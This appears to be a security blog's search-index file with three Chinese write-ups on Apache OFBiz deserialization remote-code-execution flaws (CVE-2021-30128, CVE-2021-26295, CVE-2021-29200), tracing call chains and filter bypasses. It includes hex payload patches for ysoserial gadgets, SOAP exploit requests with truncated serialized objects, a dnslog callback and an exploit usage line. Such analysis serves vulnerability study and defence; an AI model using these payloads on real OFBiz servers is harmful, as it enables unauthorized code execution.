<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>（CVE-2021-30128） Apache OFBiz 反序列化漏洞</title>
    <url>/2021/05/05/analysis_20210505/</url>
    <content><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Apache OFBiz &lt; 17.12.07</p>
<p>通过构造类描述符，来绕过限制，从而造成一个反序列化远程命令执行漏洞</p>
<span id="more"></span>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h4><ul>
<li>2021年3月22日 Apache OFBiz官方发布安全更新，修复了一处由RMI反序列化造成的远程代码执行漏洞。CVE编号为 <code>CVE-2021-26295</code>，关键在于 <code>SafeObjectInputStream</code> 中白名单的绕过。详细分析请看：<a href="https://r0ckysec.github.io/2021/03/23/analysis_20210323/">https://r0ckysec.github.io/2021/03/23/analysis_20210323/</a></li>
<li>2021年4月28日 Apache OFBiz官方发布了漏洞补丁，修复了一处远程代码执行漏洞。CVE编号为 <code>CVE-2021-30128</code>，详细分析如下。</li>
</ul>
<h4 id="从修复点入手"><a href="#从修复点入手" class="headerlink" title="从修复点入手"></a>从修复点入手</h4><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620141006038.png"></p>
<p>对比后，发现依旧是在 <code>org.apache.ofbiz.base.util.SafeObjectInputStream#SafeObjectInputStream</code> 中进行修复</p>
<h4 id="断点分析"><a href="#断点分析" class="headerlink" title="断点分析"></a>断点分析</h4><p>在 <code>framework/base/src/main/java/org/apache/ofbiz/base/util/UtilObject.java:116</code> 处断点</p>
<p>进入 <code>org.apache.ofbiz.base.util.SafeObjectInputStream#resolveClass</code> 调用链</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620141259886.png"></p>
<p>在这里进行了白名单检测，可以看到之前修复的点已经做了 <code>rmi</code> 黑名单的处理。</p>
<p>继续调试，发现 <code>framework/base/src/main/java/org/apache/ofbiz/base/util/SafeObjectInputStream.java:87</code> 调用了自定义的 <code>loadClass</code>，跟进后发现对class的类修饰符做了处理。</p>
<p>并且在 <code>framework/base/src/main/java/org/apache/ofbiz/base/util/ObjectType.java:115-118</code> 处做了<code>className</code>处理</p>
<p> <img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620141542936.png"></p>
<p>这里对 <code>className</code> 以 <code>&lt;</code> 符合进行分隔进行字符串截取，所以在 <code>className</code> 后加任意的 <code>&lt;xxx</code> 都会截断掉。</p>
<p>这里结合前面的白名单可以想到，如果我们序列化数据中的类描述符数据为</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>.BeanComparator&lt;xxxx</span><br></pre></td></tr></table></figure>

<p>那么通过自定义的 <code>loadClass</code> 处理后返回的类名，就是我们想要的</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>.BeanComparator</span><br></pre></td></tr></table></figure>

<p>在匹配白名单，其中就有 <code>java..*</code> 只要构造成 <code>java.xxx</code> 就能既符合白名单又可以绕过限制</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>.BeanComparator&lt;java.xxx</span><br></pre></td></tr></table></figure>

<p>不过在JDK中也会对传入的类描述符和最后加载的类的类名有限制</p>
<p>在 <code>java.io.ObjectStreamClass#initNonProxy</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620142570069.png"></p>
<p>进入 <code>classNamesEqual</code> 方法，对 <code>.</code> 后的进行判断类描述符和类名是否一致</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620142672094.png"></p>
<p>所以最终只要在反序列化数据中的类描述符后面构造 <code>&lt;java.BeanComparator</code>，就可以绕过限制，由于OFBiz存在<code>CommonsBeanutils</code> gadget，所以构造成 <code>org.apache.commons.beanutils.BeanComparator&lt;java.BeanComparator</code> 就可以触发无需出网的Apache OFBiz反序列化RCE。</p>
<p>不过在反序列化数据中 <code>CommonsBeanutils</code> gadget 有三处调用链，所以三处都需要修改</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span><span class="selector-class">.BeanComparator</span> 修改成 org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>.BeanComparator&lt;java.BeanComparator</span><br><span class="line"></span><br><span class="line">对应字节流：<span class="number">6</span>F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72 -&gt; <span class="number">6</span>F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F723C6A6176612E4265616E436F6D70617261746F72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.comparators</span><span class="selector-class">.ComparableComparator</span> 修改为 org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.comparators</span>.ComparableComparator&lt;java.ComparableComparator</span><br><span class="line"></span><br><span class="line">对应字节流：<span class="number">6</span>F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72 -&gt; <span class="number">6</span>F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F723C6A6176612E436F6D70617261626C65436F6D70617261746F72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span><span class="selector-class">.TemplatesImpl</span> 修改为 com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl&lt;java.TemplatesImpl</span><br><span class="line"></span><br><span class="line">对应字节流：<span class="number">636</span>F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C -&gt; <span class="number">636</span>F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C3C6A6176612E54656D706C61746573496D706C</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620143211946.png"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>利用 <code>ysoserial</code> 的 <code>CommonsBeanutils1</code> Gadget 生成Payload</p>
<p>payload需要修改</p>
<p><code>org.apache.commons.beanutils.BeanComparator</code> 修改成 <code>org.apache.commons.beanutils.BeanComparator&lt;java.BeanComparator</code></p>
<p>对应字节流：<code>6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72</code> -&gt; <code>6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F723C6A6176612E4265616E436F6D70617261746F72</code></p>
<p><code>org.apache.commons.collections.comparators.ComparableComparator</code> 修改为 <code>org.apache.commons.collections.comparators.ComparableComparator&lt;java.ComparableComparator</code></p>
<p>对应字节流：<code>6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72</code> -&gt; <code>6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F723C6A6176612E436F6D70617261626C65436F6D70617261746F72</code></p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 修改为 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;java.TemplatesImpl</code></p>
<p>对应字节流：<code>636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C</code> -&gt; <code>636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C3C6A6176612E54656D706C61746573496D706C</code></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/SOAPService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.145:8443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.24.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6093</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ser=&quot;http://ofbiz.apache.org/service/&quot;&gt;  </span><br><span class="line">  &lt;soapenv:Header/&gt;  </span><br><span class="line">  &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;ser&gt;</span><br><span class="line">      &lt;map-Map&gt;</span><br><span class="line">        &lt;map-Entry&gt;</span><br><span class="line">          &lt;map-Key&gt; &lt;cus-obj&gt;ACED0005 ... ... 871007E000D78&lt;/cus-obj&gt;</span><br><span class="line">          &lt;/map-Key&gt;  </span><br><span class="line">          &lt;map-Value&gt;  </span><br><span class="line">            &lt;std-String/&gt;</span><br><span class="line">          &lt;/map-Value&gt;</span><br><span class="line">        &lt;/map-Entry&gt;</span><br><span class="line">      &lt;/map-Map&gt;</span><br><span class="line">    &lt;/ser&gt;</span><br><span class="line">  &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620138364694.png"></p>
<h3 id="漏洞利用EXP"><a href="#漏洞利用EXP" class="headerlink" title="漏洞利用EXP"></a>漏洞利用EXP</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> cve-<span class="number">2021</span>-<span class="number">30128</span>_exp.<span class="keyword">py</span> <span class="symbol">&lt;target&gt;</span> <span class="symbol">&lt;cmd&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620144719989.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620145133205.png"></p>
<p><strong>EXP获取</strong></p>
<p><a href="https://github.com/r0ckysec/CVE-2021-30128">https://github.com/r0ckysec/CVE-2021-30128</a></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w">https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>漏洞EXP</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2021-26295）Apache OFBiz RMI反序列化漏洞</title>
    <url>/2021/03/23/analysis_20210323/</url>
    <content><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>官网获取最新版本  <a href="https://ofbiz.apache.org/download.html">https://ofbiz.apache.org/download.html</a></p>
<p>发现新版本对 <code>.\framework\base\src\main\java\org\apache\ofbiz\base\util\SafeObjectInputStream.java</code><br>的 65行 进行了修改，添加了<code>java.rmi.server</code> 黑名单，说明此处应该存在 RMI 的利用链</p>
<span id="more"></span>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616491705643.png"></p>
<h3 id="寻找-SafeObjectInputStream-类的利用链"><a href="#寻找-SafeObjectInputStream-类的利用链" class="headerlink" title="寻找 SafeObjectInputStream 类的利用链"></a>寻找 <code>SafeObjectInputStream</code> 类的利用链</h3><p>在 <code>framework/base/src/main/java/org/apache/ofbiz/base/util/UtilObject.java</code> 的114行</p>
<p>发现 <code>SafeObjectInputStream</code>类被初始化使用</p>
<p>并且直接 <code>return wois.readObject();</code>  很明显是个反序列化点</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616492427500.png"></p>
<h3 id="继续反向跟踪-UtilObject类getObjectException方法的利用链"><a href="#继续反向跟踪-UtilObject类getObjectException方法的利用链" class="headerlink" title="继续反向跟踪 UtilObject类getObjectException方法的利用链"></a>继续反向跟踪 <code>UtilObject</code>类<code>getObjectException</code>方法的利用链</h3><p>发现自身 92行 <code>getObject()</code> 方法调用了该方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616492667311.png"></p>
<h3 id="寻找-UtilObject-getObject-的调用链"><a href="#寻找-UtilObject-getObject-的调用链" class="headerlink" title="寻找 UtilObject.getObject() 的调用链"></a>寻找 <code>UtilObject.getObject()</code> 的调用链</h3><p>在 <code>framework/entity/src/main/java/org/apache/ofbiz/entity/serialize/XmlSerializer.java</code> 468行</p>
<p><code>deserializeCustom</code>方法中有调用过<code>UtilObject.getObject()</code>，从名字上看是个自定义的反序列化方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616492873628.png"></p>
<h3 id="继续跟踪直到跳出本类"><a href="#继续跟踪直到跳出本类" class="headerlink" title="继续跟踪直到跳出本类"></a>继续跟踪直到跳出本类</h3><p>在94行的 <code>deserialize</code> 方法后没有自身调用了</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616493675504.png"></p>
<h3 id="继续反向跟踪调用链"><a href="#继续反向跟踪调用链" class="headerlink" title="继续反向跟踪调用链"></a>继续反向跟踪调用链</h3><p><code>framework/service/src/main/java/org/apache/ofbiz/service/engine/SoapSerializer.java:45</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616493830653.png"></p>
<p>在 <code>framework/webapp/src/main/java/org/apache/ofbiz/webapp/event/SOAPEventHandler.java:177</code> 被 <code>SOAPEventHandler</code>类调用，并且在前面出现了<code>SOAPBody</code>等类型，说明这个类很有可能接收了<code>request body</code>，后面可以验证</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616496229703.png"></p>
<p>接着在这个方法<code>invoke()</code>的最开始可以确定这个方法接收了request请求的内容</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616496487128.png"></p>
<h3 id="调用链梳理"><a href="#调用链梳理" class="headerlink" title="调用链梳理"></a>调用链梳理</h3><p><code>request</code> -&gt; <code>SOAPEventHandler:invoke()</code> -&gt; <code>SoapSerializer:deserialize()</code> -&gt; <code>XmlSerializer:多层调用-&gt; deserializeCustom()</code> -&gt; <code>UtilObject.getObject()-&gt; getObjectException()</code> -&gt; <code>SafeObjectInputStream:return wois.readObject();</code> -&gt; 反序列化完成</p>
<h3 id="正向梳理利用链"><a href="#正向梳理利用链" class="headerlink" title="正向梳理利用链"></a>正向梳理利用链</h3><h4 id="1-通过-SOAPEventHandler-invoke-获取请求"><a href="#1-通过-SOAPEventHandler-invoke-获取请求" class="headerlink" title="1. 通过 SOAPEventHandler:invoke() 获取请求"></a>1. 通过 <code>SOAPEventHandler:invoke()</code> 获取请求</h4><p>可以看到获取了 <code>wsdl</code> 参数，这里要跳过<code>if</code>判断向下执行，所以不能带上<code>wsdl</code> 参数</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616497105360.png"></p>
<p>在173行</p>
<p><code>SOAPBody reqBody = reqEnv.getBody();</code></p>
<h4 id="2-获取到请求的-SOAPBody-内容，进入-SoapSerializer-deserialize"><a href="#2-获取到请求的-SOAPBody-内容，进入-SoapSerializer-deserialize" class="headerlink" title="2. 获取到请求的 SOAPBody 内容，进入 SoapSerializer.deserialize()"></a>2. 获取到请求的 <code>SOAPBody</code> 内容，进入 <code>SoapSerializer.deserialize()</code></h4><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616497314750.png"></p>
<h4 id="3-继续跟进-XmlSerializer-deserialize"><a href="#3-继续跟进-XmlSerializer-deserialize" class="headerlink" title="3. 继续跟进 XmlSerializer.deserialize()"></a>3. 继续跟进 <code>XmlSerializer.deserialize()</code></h4><p>多次调用后来到 <code>org.apache.ofbiz.entity.serialize.XmlSerializer#deserializeSingle</code></p>
<p><code>deserializeSingle</code>方法中开始判断xml中的标签名</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616498653848.png"></p>
<p>这里需要将恶意代码带入到反序列化中，需要经过 <code>value.put()</code> 将key和value添加到map中。</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616498972837.png"></p>
<h4 id="4-接着构造map，判断为map-开头的标签应该就行"><a href="#4-接着构造map，判断为map-开头的标签应该就行" class="headerlink" title="4. 接着构造map，判断为map-开头的标签应该就行"></a>4. 接着构造map，判断为<code>map-</code>开头的标签应该就行</h4><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616499055603.png"></p>
<p>简单构造</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map-HashMap</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map-Entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">map-Key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">map-Key</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">map-Value</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">map-Value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map-Entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map-HashMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着从465行来到了468行</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616499252529.png"></p>
<p>判断了子标签存在 <code>cus-obj</code> 才会进入逻辑，进入逻辑后</p>
<p>传入的 <code>value</code> 为Hex编码过的字节流</p>
<h4 id="5-接着跟进-UtilObject-getObject-valueBytes-利用链"><a href="#5-接着跟进-UtilObject-getObject-valueBytes-利用链" class="headerlink" title="5. 接着跟进 UtilObject.getObject(valueBytes); 利用链"></a>5. 接着跟进 <code>UtilObject.getObject(valueBytes);</code> 利用链</h4><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616499452362.png"></p>
<p>在 116行，恶意代码的字节流进入了存在漏洞的 <code>SafeObjectInputStream</code>类</p>
<h4 id="6-跟进-SafeObjectInputStream类"><a href="#6-跟进-SafeObjectInputStream类" class="headerlink" title="6. 跟进 SafeObjectInputStream类"></a>6. 跟进 <code>SafeObjectInputStream</code>类</h4><p>先进行了白名单的初始化，不过白名单限制不多</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616499656228.png"></p>
<p>最后进行<code>readObject()</code>进行反序列化</p>
<h4 id="7-调试-UtilObject-getObject-的利用链是否成功"><a href="#7-调试-UtilObject-getObject-的利用链是否成功" class="headerlink" title="7. 调试 UtilObject.getObject() 的利用链是否成功"></a>7. 调试 <code>UtilObject.getObject()</code> 的利用链是否成功</h4><p>首先 利用 ysoserial 生成RMI字节流</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616500515589.png" alt="1616500515589"></p>
<p>来到了 <code>SafeObjectInputStream</code>类</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620266932180.png" alt="1620266932180"></p>
<p>继续调试进入 <code>readObject()</code> 方法反序列化</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-06/1620266826601.png" alt="1620266826601"></p>
<p>从调试参数看这里的类名为 <code>java.rmi.server.RemoteObjectInvocationHandler</code>，而白名单里刚好有 <code>java..*</code>，在白名单内</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616500791201.png"></p>
<p>因此直接跳到最后 将恶意的字节流反序列化触发RCE漏洞。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>完整构造POC</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:ser</span>=<span class="string">&quot;http://ofbiz.apache.org/service/&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ser</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">map-Map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">map-Entry</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">map-Key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cus-obj</span>&gt;</span>ACED0005737D00...00000000000078<span class="tag">&lt;/<span class="name">cus-obj</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">map-Key</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">map-Value</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">std-String</span> <span class="attr">value</span>=<span class="string">&quot;http://p1zcbj.dnslog.cn&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">map-Value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">map-Entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">map-Map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ser</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-23/1616503541558.png"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2021-29200） Apache OFBiz 反序列化漏洞</title>
    <url>/2021/05/11/analysis_20210511/</url>
    <content><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Apache OFBiz &lt; 17.12.07</p>
<p>通过黑名单绕过，从而造成一个反序列化远程命令执行漏洞</p>
<span id="more"></span>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="CVE-2021-26295的修复"><a href="#CVE-2021-26295的修复" class="headerlink" title="CVE-2021-26295的修复"></a>CVE-2021-26295的修复</h4><p>OFBiz PMC针对CVE-2021-26295漏洞修复的commit如下：</p>
<p><a href="https://github.com/apache/ofbiz-framework/commit/1bc8a206346f251c9076c2fb9babc896ba6bdf0d">https://github.com/apache/ofbiz-framework/commit/1bc8a206346f251c9076c2fb9babc896ba6bdf0d</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass classDesc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    String className = classDesc.getName();</span><br><span class="line">    <span class="comment">// BlackList exploits; eg: don&#x27;t allow RMI here</span></span><br><span class="line">    <span class="keyword">if</span> (className.contains(<span class="string">&quot;java.rmi.server&quot;</span>)) &#123;</span><br><span class="line">        Debug.logWarning(<span class="string">&quot;***Incompatible class***: &quot;</span></span><br><span class="line">                         + classDesc.getName()</span><br><span class="line">                         + <span class="string">&quot;. java.rmi.server classes are not allowed for security reason&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;SafeObjectInputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!whitelistPattern.matcher(className).find()) &#123;</span><br><span class="line">        <span class="comment">// DiskFileItem, FileItemHeadersImpl are not serializable.</span></span><br><span class="line">        <span class="keyword">if</span> (className.contains(<span class="string">&quot;org.apache.commons.fileupload&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Debug.logWarning(<span class="string">&quot;***Incompatible class***: &quot;</span></span><br><span class="line">                         + classDesc.getName()</span><br><span class="line">                         + <span class="string">&quot;. Please see OFBIZ-10837.  Report to dev ML if you use OFBiz without changes. &quot;</span></span><br><span class="line">                         + <span class="string">&quot;Else follow https://s.apache.org/45war&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;SafeObjectInputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException(<span class="string">&quot;Incompatible class: &quot;</span> + classDesc.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ObjectType.loadClass(classDesc.getName(), Thread.currentThread().getContextClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-11/1620730203904.png"></p>
<p>直接将 <code>java.rmi.server</code> 加入了黑名单，不过还是被大佬绕过了</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>之前的 <strong>CVE-2021-26295</strong> 是使用了 <code>JRMP</code> java远程方法协议，利用 <code>java.rmi.registry.Registry</code> 来创建rmi对象</p>
<p>从 <code>yso</code> 利用工具中看实现方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">    Registry.class</span><br><span class="line">&#125;, obj);</span><br><span class="line"><span class="keyword">return</span> proxy;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-11/1620724562141.png"></p>
<p><code>yso</code> 使用了 <code>UnicastRef</code> 和远端建立tcp连接，获取RMI registry，通过 <code>RemoteObjectInvocationHandler</code> 填入一个 <code>UnicastRef</code> 对象，最后返回一个 <code>Registry</code> 对象，进行反序列化执行命令。</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-11/1620727735021.png"></p>
<p><strong>CVE-2021-26295</strong> 修复 添加了 <code>java.rmi.server</code> 黑名单，所以 <code>RemoteObjectInvocationHandler</code> 来填入<code>UnicastRef</code> 对象坑的是会被拦截的。</p>
<p>所以需要找一个既可以实现符合白名单并且是远程对象的类，<code>sun.rmi.server.UnicastRef</code> 是连接的抽象或者封装，所以这里可以直接使用 <code>sun.rmi.server.UnicastRef</code> 即可，不需要修改，只需要找一个可以填入的类，</p>
<p>而 <code>javax.management.remote.rmi.RMIConnectionImpl_Stub</code> 类刚好符合，所以重写 <code>ysoserial</code> 将<code>RemoteObjectInvocationHandler</code> 替换成 <code>RMIConnectionImpl_Stub</code> 就能绕过黑名单限制。</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-11/1620728239747.png"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>POC还是老样子只是生成的类不同</p>
